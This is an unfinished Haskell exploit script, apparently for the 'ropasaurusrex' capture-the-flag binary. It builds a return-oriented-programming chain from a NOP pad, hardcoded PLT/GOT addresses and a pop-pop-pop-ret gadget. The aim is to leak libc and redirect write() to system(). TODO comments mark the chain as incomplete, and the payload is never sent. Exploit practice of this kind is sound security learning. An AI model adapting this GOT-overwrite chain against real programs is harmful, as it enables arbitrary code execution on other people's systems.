#!/usr/bin/env stack
-- stack --resolver=lts-3.11 runghc --package=shelly --package=bytestring --package=text --package=binary --package=unix --package=conduit-extra

-- This gives us an experience similar to @ghci@.  Raw values (1 and
-- 10 below) that implement the 'Num' type class will be defaulted to 'Int'
-- (specified with the @default@ command below).  Raw values (all strings)
-- that implement the 'IsString' typeclass will be defaulted to Text (also
-- specified with the @default@ command below).
--
-- Without this extension turned on, ghc will produce errors like this:
-- @
--  code.hs:27:25:
--      No instance for (Data.String.IsString a0)
--            arising from the literal ‘"-alF"’
-- @
{-# LANGUAGE ExtendedDefaultRules #-}
{-# LANGUAGE OverloadedStrings #-}
{-# OPTIONS_GHC -Wall #-}

-- Don't warn that things (like strings and numbers) are being defaulted to
-- certain types.  It's okay because this is just shell programming.
{-# OPTIONS_GHC -fno-warn-type-defaults #-}

import Control.Monad (forM_, void)
import Data.Binary (encode)
import qualified Data.ByteString.Lazy as B
import Data.ByteString.Lazy (ByteString)
import Data.Char (chr, ord)
import Data.Conduit.Process (streamingProcess)
import Data.Int (Int64)
import Data.Monoid ((<>))
import qualified Data.Text as T
import Data.Text (Text)
import GHC.Word (Word32, Word8, byteSwap32)
import Numeric (showHex)
import Shelly ((</>), (<.>), (-|-), cmd, inspect, shelly, touchfile, withTmpDir)
import System.IO (stderr)
import System.Posix.Process (executeFile)
import System.Process (callProcess, rawSystem)

-- Define the the types that should be defaulted to.  We can define one
-- type for string-like things, and one type for integer-like things.  It
-- doesn't matter what order they are in.
default (T.Text, Int)

nop :: Word8
nop = toEnum 0x90

-- | Pads a 'ByteString' with NOPs up to length 'Word32'.
padTo :: Word32 -> ByteString -> ByteString
padTo fullBufLength string = nopSled <> string
  where
    paddingLen :: Integer
    paddingLen = toInteger fullBufLength - toInteger (B.length string)

    nopSled :: ByteString
    nopSled = B.replicate (fromInteger paddingLen) nop

toAddr :: Word32 -> Word32
toAddr = byteSwap32

nops :: ByteString
nops = B.replicate 140 nop

readAddrPLT :: Word32
readAddrPLT = toAddr 0x804832c

readAddrGOT :: Word32
-- this is the plt address
-- readAddress = toAddr 0x804832c
-- this is the got address
readAddrGOT = toAddr 0x804961c

-- this is the plt address
writeAddrPLT :: Word32
writeAddrPLT = toAddr 0x804830c

-- this is the got address
writeAddressGOT :: Word32
writeAddressGOT = toAddr 0x8049614

exploit :: ByteString
exploit = "abcd"

popPopPopRetAddr :: Word32
popPopPopRetAddr = toAddr 0x080484b6

-- TODO: This successfully prints out the address of the of write() in
-- libc, and tries to read in an address of system() to write() to
-- write()'s GOT entry.
--
-- Next, in Haskell I need to read() in the value of write()'s GOT, use it
-- to figure out the offset of system(), so that the call to read() can
-- write it to write()'s GOT.  Then I need to call write() one more time so
-- that it actually calls system().  Also need to figure out what arguments
-- to pass to system().
paddedExploit :: ByteString
paddedExploit = nops
    <> encode writeAddrPLT          -- print out address of write() to stdout.
        <> encode popPopPopRetAddr
        <> encode (toAddr 1)
        <> encode writeAddressGOT
        <> encode (toAddr 4)
    <> encode readAddrPLT           -- read in computed location of system()
                                    -- into write()'s GOT.
        <> encode popPopPopRetAddr
        <> encode (toAddr 0)
        <> encode writeAddressGOT
        <> encode (toAddr 4)
    <> encode readAddrPLT           -- read in 8 character string to feed to
                                    -- system().
        <> encode popPopPopRetAddr
        <> encode (toAddr 0)
        <> encode (toAddr 0x8049620) -- this is the .data section.
                                      -- we could also use the .bss
                                      -- at 0x08049628.
        <> encode (toAddr 8)
    <> encode writeAddrPLT -- this should be pointing to system()
        <> B.replicate 4 nop
        <> encode (toAddr 0x8049620) -- TODO: what should these args be?

main :: IO ()
main = do
    B.hPutStr stderr "\n"
    B.hPutStr stderr "---------------\n"
    B.hPutStr stderr "-- Started. --\n"
    B.hPutStr stderr "---------------\n\n"

    (pStdin, pStdout, _, _) <- streamingProcess $
        shell "./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"

    -- B.putStrLn paddedExploit

    B.hPutStr stderr "\n"
    B.hPutStr stderr "---------------\n"
    B.hPutStr stderr "-- Finished. --\n"
    B.hPutStr stderr "---------------\n\n"

